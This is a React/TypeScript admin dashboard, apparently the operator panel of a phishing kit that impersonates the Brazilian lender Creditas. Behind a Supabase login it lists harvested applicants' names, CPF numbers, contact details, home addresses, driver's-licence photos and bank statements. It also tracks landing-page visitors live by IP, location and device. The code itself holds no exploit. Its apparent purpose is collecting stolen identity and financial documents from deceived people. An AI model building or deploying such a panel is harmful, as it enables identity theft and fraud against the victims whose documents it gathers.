import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { supabase } from '@/lib/supabase';
import { Users, Activity, LogOut, MapPin, Smartphone, Globe, Clock } from 'lucide-react';

export default function Admin() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState<'cadastros' | 'visitas'>('cadastros');
  const [clientes, setClientes] = useState<any[]>([]);
  const [visitas, setVisitas] = useState<any[]>([]);

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session) {
        setIsAuthenticated(true);
        loadData();
      }
    });

    supabase.auth.onAuthStateChange((_event, session) => {
      setIsAuthenticated(!!session);
      if (session) loadData();
    });
  }, []);

  useEffect(() => {
    if (!isAuthenticated) return;

    // Supabase Real-Time Subscriptions
    const visitasChannel = supabase
      .channel('public:visitas')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'visitas' }, payload => {
        setVisitas(prev => [payload.new, ...prev]);
      })
      .subscribe();

    const clientesChannel = supabase
      .channel('public:clientes')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'clientes' }, payload => {
        setClientes(prev => [payload.new, ...prev]);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(visitasChannel);
      supabase.removeChannel(clientesChannel);
    };
  }, [isAuthenticated]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    const { error } = await supabase.auth.signInWithPassword({ email, password });
    if (error) alert(error.message);
    setLoading(false);
  };

  const loadData = async () => {
    const { data: cData, error: cError } = await supabase
      .from('clientes')
      .select('*')
      .order('created_at', { ascending: false });
    
    if (cError) {
      console.error('Erro ao carregar clientes:', cError);
    } else {
      setClientes(cData || []);
    }

    const { data: vData, error: vError } = await supabase
      .from('visitas')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(100);

    if (vError) {
      console.error('Erro ao carregar visitas:', vError);
    } else {
      setVisitas(vData || []);
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 font-sans">
        <Card className="w-full max-w-sm rounded-3xl border-none shadow-xl">
          <CardHeader className="bg-[#00C853] text-white p-8 rounded-t-3xl border-b-0">
            <CardTitle>Acesso Restrito</CardTitle>
            <CardDescription className="text-green-100">Painel Administrativo Creditas</CardDescription>
          </CardHeader>
          <CardContent className="p-8">
            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-semibold">E-mail</label>
                <Input 
                  type="email" 
                  value={email} 
                  onChange={e => setEmail(e.target.value)} 
                  required 
                  className="rounded-xl h-12 focus-visible:ring-green-500"
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-semibold">Senha</label>
                <Input 
                  type="password" 
                  value={password} 
                  onChange={e => setPassword(e.target.value)} 
                  required 
                  className="rounded-xl h-12 focus-visible:ring-green-500"
                />
              </div>
              <Button type="submit" disabled={loading} className="w-full h-12 rounded-xl bg-green-700 hover:bg-green-800 text-white border-0">
                {loading ? 'Entrando...' : 'Entrar'}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4 sm:p-8 font-sans">
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex justify-between items-center bg-white p-4 rounded-2xl shadow-sm">
          <div className="flex items-center gap-3">
             <img src="https://assets.creditas.com/microfrontends/prod/website-assets/logotipos/1.0.0/creditas/primary_logo_without_background.svg" alt="Creditas" className="h-6" />
             <h1 className="text-xl font-bold text-gray-800 border-l pl-3 ml-3">Painel de Administração</h1>
          </div>
          <Button onClick={() => supabase.auth.signOut()} variant="outline" className="rounded-xl border-gray-200">
            <LogOut className="w-4 h-4 mr-2" /> Sair
          </Button>
        </div>

        {/* Tab Navigation */}
        <div className="flex space-x-2 bg-gray-100 p-1 rounded-xl w-max">
          <button 
            onClick={() => setActiveTab('cadastros')}
            className={`flex items-center gap-2 px-6 py-3 rounded-lg font-semibold text-sm transition-all ${activeTab === 'cadastros' ? 'bg-white shadow text-[#00C853]' : 'text-gray-500 hover:text-gray-700'}`}
          >
            <Users className="w-4 h-4" />
            Cadastros Recebidos
            <span className="bg-gray-200 text-gray-600 px-2 py-0.5 rounded-full text-xs">{clientes.length}</span>
          </button>
          <button 
            onClick={() => setActiveTab('visitas')}
            className={`flex items-center gap-2 px-6 py-3 rounded-lg font-semibold text-sm transition-all ${activeTab === 'visitas' ? 'bg-white shadow text-blue-600' : 'text-gray-500 hover:text-gray-700'}`}
          >
            <Activity className="w-4 h-4" />
            Pessoas Na Landing Page
            <span className="bg-blue-100 text-blue-600 px-2 py-0.5 rounded-full text-xs font-bold animate-pulse">Ao Vivo</span>
          </button>
        </div>

        <Card className="rounded-3xl border-none shadow-md overflow-hidden bg-white">
          <div className="overflow-x-auto">
            {activeTab === 'cadastros' ? (
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="bg-[#00C853] text-white">
                    <th className="p-4 whitespace-nowrap">Data</th>
                    <th className="p-4 whitespace-nowrap">Nome</th>
                    <th className="p-4 whitespace-nowrap">Contato</th>
                    <th className="p-4 whitespace-nowrap">Endereço</th>
                    <th className="p-4 whitespace-nowrap">Documentos</th>
                  </tr>
                </thead>
                <tbody>
                  {clientes.map(cliente => (
                    <tr key={cliente.id} className="border-b last:border-0 hover:bg-gray-50 transition-colors">
                      <td className="p-4 text-sm text-gray-500 whitespace-nowrap">
                        {new Date(cliente.created_at).toLocaleString('pt-BR')}
                      </td>
                      <td className="p-4 font-semibold text-gray-800 whitespace-nowrap">
                        {cliente.nome}
                        <div className="text-xs font-mono text-gray-400 font-normal mt-1">CPF: {cliente.cpf}</div>
                      </td>
                      <td className="p-4 text-sm text-gray-600">
                        <div>{cliente.email}</div>
                        <div>{cliente.telefone}</div>
                      </td>
                      <td className="p-4 text-sm text-gray-600">
                        <div className="font-medium text-gray-800">{cliente.cidade} - {cliente.estado}</div>
                        <div className="text-xs">{cliente.rua}, {cliente.numero}</div>
                        <div className="text-xs">{cliente.bairro} (CEP: {cliente.cep})</div>
                      </td>
                      <td className="p-4">
                        <div className="flex flex-wrap gap-2 max-w-[250px]">
                          {cliente.rg_frente_url && <a href={cliente.rg_frente_url} target="_blank" rel="noreferrer" className="text-green-700 bg-green-50 hover:bg-green-100 text-xs font-medium px-2 py-1 rounded">CNH Frente</a>}
                          {cliente.rg_verso_url && <a href={cliente.rg_verso_url} target="_blank" rel="noreferrer" className="text-green-700 bg-green-50 hover:bg-green-100 text-xs font-medium px-2 py-1 rounded">CNH Verso</a>}
                          {cliente.comprovante_renda_m1_url && <a href={cliente.comprovante_renda_m1_url} target="_blank" rel="noreferrer" className="text-blue-700 bg-blue-50 hover:bg-blue-100 text-xs font-medium px-2 py-1 rounded">Extrato M1</a>}
                          {cliente.comprovante_renda_m2_url && <a href={cliente.comprovante_renda_m2_url} target="_blank" rel="noreferrer" className="text-blue-700 bg-blue-50 hover:bg-blue-100 text-xs font-medium px-2 py-1 rounded">Extrato M2</a>}
                          {cliente.comprovante_renda_m3_url && <a href={cliente.comprovante_renda_m3_url} target="_blank" rel="noreferrer" className="text-blue-700 bg-blue-50 hover:bg-blue-100 text-xs font-medium px-2 py-1 rounded">Extrato M3</a>}
                        </div>
                      </td>
                    </tr>
                  ))}
                  {clientes.length === 0 && (
                    <tr><td colSpan={5} className="p-8 text-center text-gray-500">Nenhum cliente cadastrado ainda.</td></tr>
                  )}
                </tbody>
              </table>
            ) : (
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="bg-slate-800 text-white">
                    <th className="p-4 whitespace-nowrap w-48">Acesso</th>
                    <th className="p-4 whitespace-nowrap">Localização (Ao Vivo)</th>
                    <th className="p-4 whitespace-nowrap">Dispositivo</th>
                    <th className="p-4 whitespace-nowrap">Página Acessada</th>
                  </tr>
                </thead>
                <tbody>
                  {visitas.map((visita, index) => (
                    <tr key={visita.id || index} className="border-b last:border-0 hover:bg-gray-50 transition-colors animate-in fade-in slide-in-from-top-2 duration-500">
                      <td className="p-4 text-sm whitespace-nowrap">
                        <div className="flex items-center gap-2 text-gray-800 font-medium">
                          <Clock className="w-4 h-4 text-gray-400" />
                          {new Date(visita.created_at).toLocaleTimeString('pt-BR')}
                        </div>
                        <div className="text-xs text-gray-400 mt-1 font-mono">IP: {visita.ip}</div>
                      </td>
                      <td className="p-4">
                        <div className="flex items-center gap-2 font-semibold text-slate-700">
                          <MapPin className="w-4 h-4 text-red-500" />
                          {visita.cidade}, {visita.estado}
                        </div>
                        <div className="text-xs mt-1 bg-slate-100 text-slate-500 inline-block px-2 py-0.5 rounded uppercase">{visita.pais}</div>
                      </td>
                      <td className="p-4">
                        <div className="flex items-center gap-2">
                          <Smartphone className="w-4 h-4 text-slate-600" />
                          <span className={`font-semibold ${visita.sistema_operacional === 'Android' ? 'text-green-600' : visita.sistema_operacional === 'iOS' ? 'text-blue-600' : 'text-slate-700'}`}>
                            {visita.sistema_operacional}
                          </span>
                        </div>
                        <div className="max-w-[200px] truncate text-xs text-gray-400 mt-1" title={visita.dispositivo}>
                          {visita.dispositivo}
                        </div>
                      </td>
                      <td className="p-4 text-sm text-gray-600">
                        <div className="flex items-center gap-2">
                           <Globe className="w-4 h-4 text-sky-500" />
                           <a href={visita.pagina_acessada} target="_blank" rel="noreferrer" className="text-sky-600 hover:underline truncate max-w-xs block">
                             {visita.pagina_acessada}
                           </a>
                        </div>
                      </td>
                    </tr>
                  ))}
                  {visitas.length === 0 && (
                    <tr><td colSpan={4} className="p-8 text-center text-gray-500">Aguardando visitantes...</td></tr>
                  )}
                </tbody>
              </table>
            )}
          </div>
        </Card>
      </div>
    </div>
  );
}
